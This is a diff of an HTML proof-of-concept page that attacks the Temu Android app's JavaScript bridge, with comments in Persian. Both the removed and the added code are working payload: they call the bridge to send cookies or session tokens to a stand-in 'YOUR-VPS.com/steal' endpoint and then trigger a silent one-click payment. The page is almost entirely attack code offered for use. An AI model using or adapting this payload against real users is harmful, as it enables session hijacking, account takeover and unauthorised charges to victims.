@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><title>Temu Payload</title></head>
+<head><title>Temu JS Bridge PoC</title></head>
 <body>
 <script>
-  console.log("=== Temu JS Bridge Payload ===");
-  try {
-    window.__tm_android_bridge.callNative(
-      "TMPay", 
-      "initiatePayment", 
-      JSON.stringify({amount: "0.01", currency: "USD"}), 
-      1
-    );
-    window.__tm_android_bridge.callNative("TMNetwork", "request", JSON.stringify({url: "https://your-vps.com/steal?cookie="+document.cookie}), 2);
-  } catch(e) {
-    console.log("Error: " + e);
-  }
+  console.log("=== Temu JS Bridge Payload Loaded ===");
+  const bridge = window.__tm_android_bridge;
+
+  // مرحله ۱: Session Hijack (AccessToken exfil)
+  bridge.callNative("TMNetwork", "request", JSON.stringify({
+    url: "https://YOUR-VPS.com/steal",
+    method: "POST",
+    isApiRequest: true,
+    data: JSON.stringify({ tag: "jsbridge_ato" }),
+    encode_resp: false
+  }), Date.now());
+
+  // مرحله ۲: Silent Payment (تست با مبلغ کم)
+  bridge.callNative("TMPay", "startOneClickPay", JSON.stringify({
+    request_params: {
+      scene: "inner_foot_print_addition",
+      pre_parent_order_sn: "TEST_ORDER_001"
+    }
+  }), Date.now());
+
+  console.log("All critical calls sent.");
 </script>
-<h1>Payload loaded successfully!</h1>
 </body>
 </html>
